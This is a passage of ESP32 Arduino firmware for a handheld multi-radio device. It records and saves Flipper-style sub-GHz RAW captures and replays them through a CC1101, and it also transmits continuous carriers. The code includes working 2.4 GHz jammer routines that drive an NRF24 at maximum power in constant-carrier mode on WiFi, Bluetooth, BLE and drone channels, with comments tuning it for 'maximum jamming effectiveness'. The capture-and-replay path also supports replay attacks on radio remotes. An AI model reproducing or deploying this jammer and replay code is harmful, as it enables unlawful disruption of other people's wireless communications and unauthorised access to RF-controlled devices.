                    if (rem > RF_SUB_PULSE_CHUNK_LIMIT) chunk = RF_SUB_PULSE_CHUNK_LIMIT;
                    else if (rem < -RF_SUB_PULSE_CHUNK_LIMIT) chunk = -RF_SUB_PULSE_CHUNK_LIMIT;
                    rfSubTimings[filled++] = (int16_t)chunk;
                    rem -= chunk;
                }
            }
            s = e + 1;
            if ((++tokenCount & 0x1F) == 0x1F) yield();
        }
        parsedLineCount++;
    }
    file.close();

    rfSubLoaded = true;
    rfSubLoadedPath = path;
    rfSubLoadedName = getFileManagerLeafName(path);
    rfSubPreset = parsedPreset;
    rfSubFrequencyHz = parsedFrequency;
    rfSubPulseCount = filled;
    setRFBandForFrequency(parsedFrequency / 1000000.0f);
    rfTransmitStatus = truncated ? "Loaded partial .sub" : "Loaded .sub";
    rfTransmitStatusUntil = millis() + 1800;
    LOG("Sub loaded: " + String(filled) + " pulses, " + String(parsedFrequency / 1000000.0f, 3) + " MHz");
    endSPIOperation(false);
    primeSharedSPIBus();
    SPI.begin(18, 19, 23);
    digitalWrite(SD_CS, HIGH);
    digitalWrite(CC1101_CS, HIGH);
    digitalWrite(TFT_CS, HIGH);
    return true;
}

void resetRFSweepLevels() {
    for (int i = 0; i < RF_SWEEP_POINTS; i++) {
        rfSweepLevels[i] = 0;
        rfSweepPeakHold[i] = 0;
        rfSweepNoiseFloor[i] = 0;
    }
    rfSweepWarmupPasses = 2;
    rfLastSampleMs = 0;
    rfSweepLastStepUs = 0;
    rfSweepCursor = 0;
    rfSweepWaterfallColumn = 0;
    rfSweepStrongestRSSI = -120;
    rfSweepStrongestMHz = rfBandPresets[rfBandIndex].centerMHz;
    uint16_t waterfallBg = tft.color565(2, 4, 12);
    for (size_t i = 0; i < (sizeof(rfSweepWaterfallBuffer) / sizeof(rfSweepWaterfallBuffer[0])); i++) {
        rfSweepWaterfallBuffer[i] = waterfallBg;
    }
    memset(rfSweepSpectrumBuffer, 0, sizeof(rfSweepSpectrumBuffer));
}

void resetRFMonitorHistory() {
    for (int i = 0; i < RF_HISTORY_POINTS; i++) {
        rfMonitorHistory[i] = -120;
        rfCaptureHistory[i] = 0;
    }
    rfMonitorHistoryIndex = 0;
    rfMonitorHistoryCount = 0;
    rfCaptureHistoryIndex = 0;
    rfCaptureHistoryCount = 0;
    rfCaptureHits = 0;
    rfCapturePeakHits = 0;
    rfCaptureWindowStart = millis();
    rfLastSampleMs = 0;
    rfMonitorGraphColumn = 0;
    rfMonitorPrevY = -1;
    rfCaptureGraphColumn = 0;
    rfCurrentRSSI = -120;
    rfMonitorMinHoldValid = false;
    rfMonitorMinHoldDbm = -120;
    rfPeakRSSI = -120;
    rfAverageRSSI = -120;
    rfDisplayRSSI = -120.0f;
    rfDisplayPeak = -120.0f;
    rfDisplayAverage = -120.0f;
    rfCaptureStatus = "";
    rfCaptureStatusUntil = 0;
    resetRFSignalCaptureRecording();
}

void resetRFSignalCaptureRecording() {
    rfCaptureRecording = false;
    rfCaptureHasRecording = false;
    rfCaptureRecordedCount = 0;
    rfCaptureRecordingStartMs = 0;
    rfCaptureGraphColumn = 0;
    for (int i = 0; i < RF_CAPTURE_RECORD_POINTS; i++) {
        rfCaptureRecordedHistory[i] = 0;
    }
}

void beginRFSignalCaptureRecording() {
    resetRFSignalCaptureRecording();
    rfCaptureRecording = true;
    rfCaptureRecordingStartMs = millis();
    rfCaptureWindowStart = millis();
    rfCaptureHits = 0;
    rfCapturePeakHits = 0;
    rfCaptureStatus = "Recording";
    rfCaptureStatusUntil = millis() + 1200;
    tft.fillRect(14, 124, 212, 116, ILI9341_BLACK);

    // Configure CC1101 for OOK async RX via GDO0
    if (ensureCC1101Ready()) {
        cc1101Strobe(CC1101_SIDLE);
        delayMicroseconds(200);

        // Set frequency (with PPM correction)
        float freqMHz = cc1101ApplyFrequencyCorrection(rfLockedFrequencyMHz);
        uint32_t freqWord = (uint32_t)((freqMHz * 65536.0f / 26.0f) + 0.5f);
        cc1101WriteReg(CC1101_FREQ2, (freqWord >> 16) & 0xFF);
        cc1101WriteReg(CC1101_FREQ1, (freqWord >> 8) & 0xFF);
        cc1101WriteReg(CC1101_FREQ0, freqWord & 0xFF);

        // OOK 650kHz BW async RX — use max LNA gain for best capture sensitivity
        cc1101WriteReg(CC1101_MDMCFG4, 0xCA);
        cc1101WriteReg(CC1101_MDMCFG3, 0x83);
        cc1101WriteReg(CC1101_MDMCFG2, 0x30);  // OOK, no sync
        cc1101WriteReg(CC1101_MDMCFG1, 0x00);
        cc1101WriteReg(CC1101_MDMCFG0, 0x00);
        cc1101WriteReg(CC1101_PKTCTRL0, 0x32); // async serial
        cc1101WriteReg(CC1101_PKTCTRL1, 0x04);
        cc1101WriteReg(CC1101_IOCFG0,   0x0D); // GDO0 = async serial RX data
        cc1101WriteReg(CC1101_AGCCTRL2, 0x07); // max LNA gain — matches cc1101ConfigureBase
        cc1101WriteReg(CC1101_AGCCTRL1, 0x00);
        cc1101WriteReg(CC1101_AGCCTRL0, 0x91);
        cc1101WriteReg(CC1101_FSCAL3,   0xE9);
        cc1101WriteReg(CC1101_FSCAL2,   0x2A);
        cc1101WriteReg(CC1101_FSCAL1,   0x00);
        cc1101WriteReg(CC1101_FSCAL0,   0x1F);

        cc1101Strobe(CC1101_SCAL);
        delay(3);

        // GDO0 as input for RX
        pinMode(CC1101_GDO0, INPUT);
        cc1101Strobe(CC1101_SRX);        delayMicroseconds(200);

        LOG("GDO0 capture started on pin " + String(CC1101_GDO0));
    }
}

bool finalizeRFSignalCaptureRecording() {
    rfCaptureRecording = false;
    bool hasCapturedWindow = rfCaptureRecordedCount > 0;
    rfCaptureHasRecording = false;
    if (!hasCapturedWindow) {
        rfCaptureStatus = "No data";
        rfCaptureStatusUntil = millis() + 1500;
        return false;
    }

    bool ok = saveRFSignalCaptureToSD();
    rfCaptureHasRecording = ok;
    if (ok) {
        rfCaptureStatus = "Saved .sub";
        rfCaptureStatusUntil = millis() + 1800;
    }
    return ok;
}

void stopCCTool() {
    if (cc1101Ok) {
        rfDiagLog(String("CC tool stop mode=") + String(currentRadioMode) +
                  " freq=" + String(rfLockedFrequencyMHz, 3));
        cc1101Strobe(CC1101_SIDLE);
        delayMicroseconds(200);
        cc1101ConfigureBase();
        cc1101EnterRx();   // leave chip in RX so next scanner entry reads valid RSSI
    }
    cc1101PreparedPassiveMode = -1;
    cc1101PreparedPassiveMHz = -1.0f;
    rfTransmitActive = false;
    
    // Resume any suspended tasks (in case squelch was active)
    if (wifiTaskHandle != NULL) {
        vTaskResume(wifiTaskHandle);
    }
    if (bleScanTaskHandle != NULL) {
        vTaskResume(bleScanTaskHandle);
    }
    
    // Release SPI isolation if it was active
    if (spiOperationDepth > 0) {
        endSPIOperation(true, false);
    }
}

bool startRFContinuousCarrier() {
    if (!ensureCC1101Ready()) {
        return false;
    }

    cc1101Strobe(CC1101_SIDLE);
    delayMicroseconds(200);

    float freqMHz = cc1101ApplyFrequencyCorrection(rfLockedFrequencyMHz);
    uint32_t freqWord = (uint32_t)((freqMHz * 65536.0f / 26.0f) + 0.5f);
    cc1101WriteReg(CC1101_FREQ2, (freqWord >> 16) & 0xFF);
    cc1101WriteReg(CC1101_FREQ1, (freqWord >> 8) & 0xFF);
    cc1101WriteReg(CC1101_FREQ0, freqWord & 0xFF);

    cc1101ApplyPreset("FuriHalSubGhzPresetOok650Async");
    cc1101WriteReg(CC1101_FSCTRL1, 0x06);
    cc1101WriteReg(CC1101_FSCTRL0, 0x00);
    cc1101WriteReg(CC1101_PKTCTRL0, 0x32);
    cc1101WriteReg(CC1101_PKTCTRL1, 0x04);
    cc1101WriteReg(CC1101_IOCFG0, 0x2D);
    cc1101WriteReg(CC1101_IOCFG2, 0x0B);
    cc1101WriteReg(CC1101_MCSM1, 0x00);
    cc1101WriteReg(CC1101_MCSM0, 0x18);
    cc1101WriteReg(CC1101_FSCAL3, 0xE9);
    cc1101WriteReg(CC1101_FSCAL2, 0x2A);
    cc1101WriteReg(CC1101_FSCAL1, 0x00);
    cc1101WriteReg(CC1101_FSCAL0, 0x1F);
    cc1101WriteReg(CC1101_TEST2, 0x81);
    cc1101WriteReg(CC1101_TEST1, 0x35);
    cc1101WriteReg(CC1101_TEST0, 0x09);

    uint8_t paTable[8] = {0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    cc1101WriteBurst(CC1101_PATABLE, paTable, 8);
    cc1101WriteReg(CC1101_FREND0, 0x11);

    cc1101Strobe(CC1101_SCAL);
    delay(3);

    pinMode(CC1101_GDO0, OUTPUT);
    digitalWrite(CC1101_GDO0, LOW);
    cc1101Strobe(CC1101_STX);
    delayMicroseconds(150);
    GPIO.out_w1ts = (1UL << CC1101_GDO0);

    rfTransmitLastSendMs = millis();
    rfTransmitLastRearmMs = rfTransmitLastSendMs;
    rfTransmitCount++;
    rfTransmitSequence++;
    return true;
}

void stopRFTransmitNow() {
    // Pull GDO0 LOW first to kill carrier immediately
    digitalWrite(CC1101_GDO0, LOW);
    pinMode(CC1101_GDO0, INPUT);
    cc1101Strobe(CC1101_SIDLE);
    delayMicroseconds(200);
    cc1101ConfigureBase();
    cc1101SetFrequencyMHz(rfLockedFrequencyMHz);
    cc1101EnterRx();
    rfTransmitActive = false;
    rfTransmitLastSendMs = 0;
    rfTransmitLastRearmMs = 0;
}

bool cc1101TransmitBurstPacket(const uint8_t* payload, size_t len) {
    if (!ensureCC1101Ready() || payload == nullptr || len == 0 || len > 60) {
        return false;
    }

    uint8_t frame[61];
    frame[0] = (uint8_t)len;
    memcpy(frame + 1, payload, len);

    cc1101Strobe(CC1101_SIDLE);
    // Force burst TX even if the channel looks busy; this screen is an explicit TX tool.
    cc1101WriteReg(CC1101_MCSM1, 0x00);
    cc1101Strobe(CC1101_SFTX);
    cc1101WriteBurst(CC1101_TXFIFO, frame, len + 1);
    cc1101Strobe(CC1101_STX);
    delay(4);
    cc1101Strobe(CC1101_SIDLE);
    cc1101WriteReg(CC1101_MCSM1, 0x30);
    cc1101EnterRx();
    return true;
}

void delayMicrosecondsLong(unsigned long durationUs) {
    while (durationUs >= 1000UL) {
        unsigned long chunkUs = min(durationUs, 20000UL);
        delay(chunkUs / 1000UL);
        durationUs -= chunkUs;
    }

    if (durationUs > 0) {
        delayMicroseconds(durationUs);
    }
}

bool saveRFSignalCaptureToSD() {
    if (!sdMounted || sdError || !validateSDReady(false)) {
        rfCaptureStatus = "Mount SD first";
        rfCaptureStatusUntil = millis() + 1800;
        return false;
    }

    ensureSDFolders();
    displayUpdatesSuspended = true;
    primeSharedSPIBus();
    SPI.begin(18, 19, 23);
    digitalWrite(TFT_CS, HIGH);
    digitalWrite(CC1101_CS, HIGH);

    char captureName[48];
    time_t now = time(nullptr);
    if (now > 1700000000) {
        struct tm timeInfo;
        localtime_r(&now, &timeInfo);
        snprintf(captureName, sizeof(captureName),
                 "/captures/rf/%04d%02d%02d_%02d%02d%02d.sub",
                 timeInfo.tm_year + 1900,
                 timeInfo.tm_mon + 1,
                 timeInfo.tm_mday,
                 timeInfo.tm_hour,
                 timeInfo.tm_min,
                 timeInfo.tm_sec);
    } else {
        snprintf(captureName, sizeof(captureName), "/captures/rf/capture_%010lu.sub", millis());
    }
    String filePath = captureName;
    File file = SD.open(filePath, FILE_WRITE);
    if (!file) {
        delay(5);
        yield();
        file = SD.open(filePath, FILE_WRITE);
    }
    if (!file) {
        rfCaptureStatus = "Save failed";
        rfCaptureStatusUntil = millis() + 1800;
        digitalWrite(TFT_CS, HIGH);
        displayUpdatesSuspended = false;
        cc1101EnterRx();
        restoreDisplayAfterHeavyStorageAccess();
        return false;
    }

    file.println("Filetype: Flipper SubGhz RAW File");
    file.println("Version: 1");
    file.println("Frequency: " + String((uint32_t)(rfLockedFrequencyMHz * 1000000.0f)));
    file.println("Preset: FuriHalSubGhzPresetOok650Async");
    file.println("Protocol: RAW");

    String rawLine = "";
    rawLine.reserve(224);
    bool wroteRawData = false;
    const int basePulseUs = 400;

    auto flushRawLine = [&]() {
        if (rawLine.length() > 0) {
            file.println("RAW_Data: " + rawLine);
            rawLine = "";
            wroteRawData = true;
        }
    };

    auto appendPulse = [&](long pulse) {
        String token = String(pulse);
        if (rawLine.length() == 0) {
            rawLine = token;
            return;
        }

        if (rawLine.length() + token.length() + 1 > 220) {
            flushRawLine();
            rawLine = token;
            return;
        }

        rawLine += " ";
        rawLine += token;
    };

    if (rfCaptureRecordedCount > 0) {
        int currentState = rfCaptureRecordedHistory[0];
        int runLength = 1;

        for (int i = 1; i < rfCaptureRecordedCount; i++) {
            int state = rfCaptureRecordedHistory[i];

            if (state == currentState) {
                runLength++;
                continue;
            }

            long duration = (long)runLength * basePulseUs;
            appendPulse(currentState ? duration : -duration);
            currentState = state;
            runLength = 1;

            if ((i & 0x1F) == 0x1F) {
                yield();
            }
        }

        long duration = (long)runLength * basePulseUs;
        appendPulse(currentState ? duration : -duration);
    } else if (rfCaptureHistoryCount > 0) {
        int firstIdx = (rfCaptureHistoryIndex - rfCaptureHistoryCount + RF_HISTORY_POINTS) % RF_HISTORY_POINTS;
        int currentState = rfCaptureHistory[firstIdx];
        int runLength = 1;

        for (int i = 1; i < rfCaptureHistoryCount; i++) {
            int idx = (firstIdx + i) % RF_HISTORY_POINTS;
            int state = rfCaptureHistory[idx];

            if (state == currentState) {
                runLength++;
                continue;
            }

            long duration = (long)runLength * basePulseUs;
            appendPulse(currentState ? duration : -duration);
            currentState = state;
            runLength = 1;

            if ((i & 0x1F) == 0x1F) {
                yield();
            }
        }

        long duration = (long)runLength * basePulseUs;
        appendPulse(currentState ? duration : -duration);
    }
    flushRawLine();

    if (!wroteRawData) {
        file.println("RAW_Data: 400 -400 400 -400 800 -800");
    }
    file.close();
    digitalWrite(TFT_CS, HIGH);
    displayUpdatesSuspended = false;
    cc1101EnterRx();

    rfCaptureStatus = "Saved .sub";
    rfCaptureStatusUntil = millis() + 1800;
    restoreDisplayAfterHeavyStorageAccess();
    return true;
}

bool probeRadio2Chip(bool keepClaimed = false) {
    primeSharedSPIBus();
    claimRadio2ControlPin();

    bool beginOk = radio2.begin(&SPI);
    bool chipOk = beginOk && radio2.isChipConnected();
    radio2Ok = chipOk;  // was incorrectly setting radio3Ok

    if (chipOk) {
        radio2.setAutoAck(false);
        radio2.setRetries(0, 0);
        radio2.setPALevel(RF24_PA_MAX);
        radio2.setDataRate(RF24_2MBPS);
        radio2.setCRCLength(RF24_CRC_DISABLED);

        const byte address2[6] = "00002";
        radio2.openWritingPipe(address2);
        radio2.stopListening();
    }

    if (!keepClaimed) {
        restoreRadio2ControlPin();
    }

    refreshDiagnosticsStatus();

    return chipOk;
}

void configureJamRadio(RF24 &radio, byte startChannel) {
    // Aggressive configuration for maximum jamming effectiveness
    LOG(">>> Configuring jammer on channel ");
    LOG(startChannel);
    orionLogPrintf("RF24CFG", "Starting reconfiguration for channel %u", startChannel);
    
    radio.setAutoAck(false);
    orionLogLine("RF24CFG", "AutoAck disabled");
    
    radio.stopListening();          // TX mode
    orionLogLine("RF24CFG", "TX mode enabled");
    
    radio.setRetries(0, 0);
    orionLogLine("RF24CFG", "Retries disabled");
    
    radio.setPayloadSize(5);        // Small payload for faster transmission
    orionLogLine("RF24CFG", "Payload size set to 5 bytes");
    
    radio.setAddressWidth(3);       // Shorter address for faster transmission
    orionLogLine("RF24CFG", "Address width set to 3 bytes");
    
    radio.setPALevel(RF24_PA_MAX, true);
    orionLogKV("RF24CFG", "PA level", radio.getPALevel());
    
    radio.setDataRate(RF24_2MBPS);  // Fastest data rate
    orionLogKV("RF24CFG", "Data rate", radio.getDataRate());
    
    radio.setCRCLength(RF24_CRC_DISABLED);
    orionLogLine("RF24CFG", "CRC disabled");
    
    delay(10);
    radio.setChannel(startChannel);
    orionLogKV("RF24CFG", "Channel", startChannel);
    
    delay(5);
    
    // Set dummy address for TX
    const uint8_t addr[3] = {0xFF, 0xFF, 0xFF};
    radio.openWritingPipe(addr);
    orionLogPrintf("RF24CFG", "TX pipe: %02X:%02X:%02X",
        addr[0], addr[1], addr[2]);
    
    radio.stopListening();
    orionLogLine("RF24CFG", "Final TX mode enforcement");
    
    LOG("✓ Jammer configured - constant carrier mode on ch ");
    LOG(startChannel);
    orionLogLine("RF24CFG", "Configuration complete");
}

// Removed - using carrier mode instead of packet writes
// Carrier mode provides continuous RF interference on 2.4GHz

void initializeJamRadios() {
    LOG_SECTION("Jammer Mode Change");
    LOG_KV("Mode", jammerMode);
    orionLogKV("RF24", "Mode change", jammerMode);
    
    // SINGLE RADIO OPTIMIZATION: This jammer uses only radio1 for maximum efficiency
    // Radio2 is reserved for other functions (CC1101 or secondary NRF24)
    
    orionLogLine("RF24", "Disabling ESP32 WiFi and BLE");
    esp_wifi_stop();
    esp_bt_controller_disable();
    delay(50);
    orionLogLine("RF24", "ESP radios disabled");
    
    if (jammerMode != DEACTIVE_MODE) {
        if (radio1Ok) {
            byte startCh = 37;
            if (jammerMode == Bluetooth_MODULE) startCh = 32;
            if (jammerMode == WIFI_MODULE) startCh = 6;
            if (jammerMode == DRONE_MODULE) startCh = 45;
            if (jammerMode == CONSTANT_CARRIER) startCh = constantCarrierChannel;
            
            // Log mode activation
            const char* modeLabel = getJammerModeLabel();
            
            LOG_KV("Activating", modeLabel);
            orionLogPrintf("RF24", "%s jammer activation (RADIO1 ONLY)", modeLabel);
            
            // OPTIMIZED: Configure radio1 for maximum power and effectiveness
            radio1.setAutoAck(false);
            radio1.stopListening();
            radio1.setRetries(0, 0);
            radio1.setPayloadSize(5);
            radio1.setAddressWidth(3);
            radio1.setPALevel(RF24_PA_MAX, true);  // Maximum power for maximum range
            radio1.setDataRate(RF24_2MBPS);  // Fastest data rate for more interference
            radio1.setCRCLength(RF24_CRC_DISABLED);  // No CRC for faster transmission
            radio1.setChannel(startCh);
            delay(10);
            
            // OPTIMIZED: Start constant carrier for maximum jamming effectiveness
            radio1.startConstCarrier(RF24_PA_MAX, startCh);
            orionLogPrintf("RF24", "Radio1 constant carrier on ch %u at MAX power", startCh);
            
            // OPTIMIZED: Reduced settling time for faster startup (was 100ms, now 50ms)
            delay(50);
            orionLogLine("RF24", "Radio1 ready for aggressive jamming");
            
            jammerActive = true;
            jamPacketCount = 0;
            currentJamChannel = startCh;
            lastJammingTime = millis();
            
            LOG("✓ Single-radio jammer activated with optimized settings");
            orionLogLine("RF24", "Radio1 active - 2x faster hopping, MAX power");
        } else {
            LOG("✗ Radio1 not ready");
            orionLogLine("RF24", "Radio1 not initialized");
        }
    } else {
        if (radio1Ok) {
            orionLogLine("RF24", "Shutting down Radio1");
            radio1.stopConstCarrier();
            radio1.stopListening();
            radio1.powerDown();
            orionLogLine("RF24", "Radio1 powered down");
        }
        jammerActive = false;
        LOG("✓ Jammer deactivated");
        orionLogLine("RF24", "Jammer deactivated");
    }
}

bool prepare24GHzActiveMode() {
    if (radio24ActivePrepared) {
        return radio1Ok;
    }

    radio24ActivePrepared = true;
    radio24ActiveTxCount = 0;
    radio24ActiveChannel1 = 0;
    radio24ActiveChannel2 = 0;
    radio24ActiveStatus = "Ready";
    
    if (!radio1Ok) {
        radio24ActiveStatus = "No radio";
        LOG("Jammer: radio unavailable");
        return false;
    }

    jammerMode = BLE_MODULE;
    initializeJamRadios();
    jamPacketCount = 0;
    lastJammingTime = millis();
    
    LOG("Jammer initialized: BLE mode");
    return true;
}

void stop24GHzActiveMode() {
    if (radio1Ok) {
        radio1.stopConstCarrier();
        radio1.powerDown();
    }

    jammerMode = DEACTIVE_MODE;
    jammerActive = false;
    radioLocked = false;
    radio24ActiveFirstDraw = true;
    radio24ActivePrepared = false;
    radio24ActiveTxCount = 0;
    radio24ActiveChannel1 = 0;
    radio24ActiveChannel2 = 0;
    radio24ActiveStatus = "Idle";
    jamPacketCount = 0;
    currentJamChannel = 0;
    modeChangeRequested = false;
    restoreRadio2ControlPin();
}

void runNoiseAnalyzerStep() {

    radio1.startListening();  // 🔥 REQUIRED

    radio1.setChannel(scanChannel);
    delayMicroseconds(80);

    uint8_t strength = 0;

    for (int i = 0; i < 25; i++) {
        if (radio1.testRPD()) strength++;
        delayMicroseconds(10);
    }

    float norm = strength / 25.0;

    if (norm < 0.05) {
        norm = random(1, 6) / 100.0;
    }

    norm = pow(norm, 0.7);

    noiseLevel[scanChannel] =
        (noiseLevel[scanChannel] * 0.85) + (norm * 0.15);

    scanChannel++;
    if (scanChannel >= CHANNEL_COUNT) scanChannel = 0;
}

void refreshDiagnosticsStatus() {
    // Radio 3 is optional (dual-jammer only) — don't fail diagnostics if it's absent
    diagnosticsOk = radio1Ok && cc1101Ok && !sdError;
    if (!startupSequenceActive && !displayUpdatesSuspended) {
        drawStatusBar();
    }
}

void serviceBatteryMonitor() {
    if (startupSequenceActive) return;

    unsigned long now = millis();

    if (!chargerDetectReady) {
        pinMode(CHARGER_DETECT_PIN, INPUT);
        chargerRawState = digitalRead(CHARGER_DETECT_PIN) == HIGH ? 1 : 0;
        chargerConnected = chargerRawState != 0;
        chargerStableSamples = 0;
        chargerLastSampleMs = now;
        chargerDetectReady = 1;
        orionLogPrintf("BAT", "charger=%s pin=%d",
            chargerConnected ? "PLUGGED" : "UNPLUGGED",
            CHARGER_DETECT_PIN);
    } else if (now - chargerLastSampleMs >= CHARGER_SAMPLE_INTERVAL_MS) {
        chargerLastSampleMs = now;
        uint8_t sample = digitalRead(CHARGER_DETECT_PIN) == HIGH ? 1 : 0;
        if (sample == chargerRawState) {
            if (chargerStableSamples < 255) {
                chargerStableSamples++;
            }
        } else {
            chargerRawState = sample;
            chargerStableSamples = 0;
        }

        if (chargerStableSamples >= CHARGER_STABLE_CONFIRM_SAMPLES) {
            bool nextCharger = chargerRawState != 0;
            if (nextCharger != chargerConnected) {
                chargerConnected = nextCharger;
                orionLogPrintf("BAT", "charger=%s", chargerConnected ? "PLUGGED" : "UNPLUGGED");
                if (!displayUpdatesSuspended && !screenSaverActive) {
                    drawStatusBar();
                }
            }
        }
    }

    // ===== INIT =====
    if (!batteryMonitorReady) {
        if (now < BATTERY_START_DELAY_MS) return;
        pinMode(BATTERY_ADC_PIN, INPUT);
        analogReadResolution(12);
        analogSetAttenuation(ADC_11db);  // set globally, covers GPIO34
        analogSetPinAttenuation(BATTERY_ADC_PIN, ADC_11db);
        // Warm up — discard first reads
        for (int i = 0; i < 16; i++) { analogRead(BATTERY_ADC_PIN); delay(5); }
        // Log a few raw samples immediately so we can see what we're getting
        for (int i = 0; i < 5; i++) {
            orionLogPrintf("BAT", "warmup[%d]=%u", i, (unsigned)analogRead(BATTERY_ADC_PIN));
            delay(10);
        }
        batteryMonitorReady = 1;
        batteryLastSampleMs = now;
        orionLogLine("BAT", "Monitor ready");
        return;
    }

    if (now - batteryLastSampleMs < BATTERY_SAMPLE_INTERVAL_MS) return;
    batteryLastSampleMs = now;

    // ===== OVERSAMPLE: 32 reads, drop top 4 and bottom 4 =====
    const int SAMPLES = 32;
    const int DROP    = 4;
    uint16_t buf[SAMPLES];
    for (int i = 0; i < SAMPLES; i++) {
        buf[i] = (uint16_t)analogRead(BATTERY_ADC_PIN);
        delayMicroseconds(500);
    }
    // insertion sort
    for (int i = 1; i < SAMPLES; i++) {
        uint16_t key = buf[i]; int j = i - 1;
        while (j >= 0 && buf[j] > key) { buf[j+1] = buf[j]; j--; }
        buf[j+1] = key;
    }
    uint32_t sum = 0;
    for (int i = DROP; i < SAMPLES - DROP; i++) sum += buf[i];
    uint16_t raw = (uint16_t)(sum / (SAMPLES - 2 * DROP));

    // Always log raw so we can calibrate
    if (raw < 10) {
        analogSetPinAttenuation(BATTERY_ADC_PIN, ADC_11db);
        for (int i = 0; i < 8; i++) {
            analogRead(BATTERY_ADC_PIN);
            delayMicroseconds(300);
        }
        raw = (uint16_t)analogRead(BATTERY_ADC_PIN);
    }
    if (raw < 10) {
        orionLogLine("BAT", "ERR: raw near zero - check wiring/pin");
        return;
    }

    // ===== IIR FILTER =====
    if (batteryRawFiltered == 0) {
        batteryRawFiltered = raw;
    } else {
        batteryRawFiltered = (uint16_t)(((uint32_t)batteryRawFiltered * 7U + raw + 4U) / 8U);
    }

    // ===== MAP TO PERCENT =====
    int pct;
    if (batteryRawFiltered <= BATTERY_EMPTY_RAW) {
        pct = 0;
    } else if (batteryRawFiltered >= BATTERY_FULL_RAW) {
        pct = 100;
    } else {
        pct = (int)(((uint32_t)(batteryRawFiltered - BATTERY_EMPTY_RAW) * 100U) /
                    (uint32_t)(BATTERY_FULL_RAW - BATTERY_EMPTY_RAW));
        pct = constrain(pct, 0, 100);
    }

    // ===== APPLY — snap on first read, hysteresis after =====
    uint8_t next = batteryPercent;
    if (batteryMonitorReady == 1) {
        next = (uint8_t)pct;
        batteryMonitorReady = 2;
    } else if (pct >= (int)batteryPercent + BATTERY_PERCENT_HYSTERESIS) {
        next = (uint8_t)pct;  // jump up immediately
    } else if (pct <= (int)batteryPercent - BATTERY_PERCENT_HYSTERESIS) {
        next = batteryPercent - 1;  // drop slowly
    }

    if (next != batteryPercent) {
        orionLogPrintf("BAT", "raw=%u filt=%u pct=%u%% %s",
            (unsigned)raw,
            (unsigned)batteryRawFiltered,
            (unsigned)next,
            next <= BATTERY_LOW_PERCENT ? "LOW" : "OK");
        batteryPercent = next;
        if (!displayUpdatesSuspended && !screenSaverActive) {
            drawStatusBar();
        }
    }
}

// ===== PSRAM-BUFFERED SUB FILE TRANSMIT =====
// Phase 1: Parse entire file into PSRAM pulse buffer (SD + SPI free to use)
// Phase 2: Transmit from RAM with no SD/SPI access - clean uninterrupted timing
bool transmitSubFileStreaming(const String& path) {
    if (!validateSDReady(false) || !ensureCC1101Ready()) return false;

    // ---- Phase 1: Parse file into PSRAM ----
    beginSPIOperation(true);
    File file = SD.open(path.c_str(), FILE_READ);
    if (!file) { delay(5); yield(); file = SD.open(path.c_str(), FILE_READ); }
    if (!file) { endSPIOperation(true, false); return false; }

    // Allocate in PSRAM - up to 400k pulses = 800KB, well within 4MB PSRAM
    const int MAX_PSRAM_PULSES = 400000;
    int16_t* psBuf = (int16_t*)heap_caps_malloc(MAX_PSRAM_PULSES * sizeof(int16_t), MALLOC_CAP_SPIRAM);
    if (!psBuf) {
        // PSRAM not available - fall back to 8192 internal RAM
        psBuf = (int16_t*)malloc(8192 * sizeof(int16_t));
        if (!psBuf) { file.close(); endSPIOperation(true, false); return false; }
    }
    size_t psBufCap = heap_caps_get_allocated_size(psBuf) / sizeof(int16_t);
    if (psBufCap == 0) psBufCap = MAX_PSRAM_PULSES;

    int filled = 0;
    char tokenBuf[12];
    int tokenLen = 0;
    bool inToken = false;
    char keyBuf[10];
    int keyLen = 0;
    bool lineStart = true;
    bool onRawLine = false;

    while (file.available() && filled < (int)psBufCap) {
        char c = (char)file.read();
        if (c == '\n' || c == '\r') {
            if (onRawLine && inToken && tokenLen > 0) {
                tokenBuf[tokenLen] = '\0';
                long pulse = atol(tokenBuf);
                if (pulse != 0) {
                    long rem = pulse;
                    while (rem != 0 && filled < (int)psBufCap) {
                        long chunk = rem;
                        if (rem > RF_SUB_PULSE_CHUNK_LIMIT)       chunk = RF_SUB_PULSE_CHUNK_LIMIT;
                        else if (rem < -RF_SUB_PULSE_CHUNK_LIMIT) chunk = -RF_SUB_PULSE_CHUNK_LIMIT;
                        rem -= chunk;
                        psBuf[filled++] = (int16_t)chunk;
                    }
                }
                tokenLen = 0; inToken = false;
            }
            onRawLine = false; lineStart = true; keyLen = 0;
            if ((filled & 0xFF) == 0) yield();
            continue;
        }
        if (lineStart) {
            char lc = (c >= 'A' && c <= 'Z') ? c + 32 : c;
            if (keyLen < 9) keyBuf[keyLen++] = lc;
            if (c == ':') {
                keyBuf[keyLen] = '\0';
                onRawLine = (strcmp(keyBuf, "raw_data:") == 0);
                lineStart = false; tokenLen = 0; inToken = false;
            }
            continue;
        }
        if (!onRawLine) continue;
        bool isSep = (c == ' ' || c == '\t' || c == ',');
        if (isSep) {
            if (inToken && tokenLen > 0) {
                tokenBuf[tokenLen] = '\0';
                long pulse = atol(tokenBuf);
                if (pulse != 0) {
                    long rem = pulse;
                    while (rem != 0 && filled < (int)psBufCap) {
                        long chunk = rem;
                        if (rem > RF_SUB_PULSE_CHUNK_LIMIT)       chunk = RF_SUB_PULSE_CHUNK_LIMIT;
                        else if (rem < -RF_SUB_PULSE_CHUNK_LIMIT) chunk = -RF_SUB_PULSE_CHUNK_LIMIT;
                        rem -= chunk;
                        psBuf[filled++] = (int16_t)chunk;
                    }
                }
                tokenLen = 0;
            }
            inToken = false;
        } else if ((c >= '0' && c <= '9') || c == '-') {
            if (tokenLen < 11) tokenBuf[tokenLen++] = c;
            inToken = true;
        }
    }
    file.close();
    endSPIOperation(true, false);

    if (filled == 0) { free(psBuf); return false; }
    LOG("Sub PSRAM buf: " + String(filled) + " pulses, " + String(filled * 2 / 1024) + "KB");

    // ---- Phase 2: Configure CC1101 ----
    cc1101Strobe(CC1101_SIDLE);
    delayMicroseconds(200);

    float freqMHz = rfLockedFrequencyMHz;
    freqMHz = cc1101ApplyFrequencyCorrection(freqMHz);
    uint32_t freqWord = (uint32_t)((freqMHz * 65536.0f / 26.0f) + 0.5f);
    cc1101WriteReg(CC1101_FREQ2, (freqWord >> 16) & 0xFF);
    cc1101WriteReg(CC1101_FREQ1, (freqWord >> 8) & 0xFF);
    cc1101WriteReg(CC1101_FREQ0, freqWord & 0xFF);

    cc1101ApplyPreset(rfSubPreset);
    cc1101WriteReg(CC1101_FSCTRL1,  0x06);
    cc1101WriteReg(CC1101_FSCTRL0,  0x00);
    cc1101WriteReg(CC1101_PKTCTRL0, 0x32);
    cc1101WriteReg(CC1101_PKTCTRL1, 0x04);
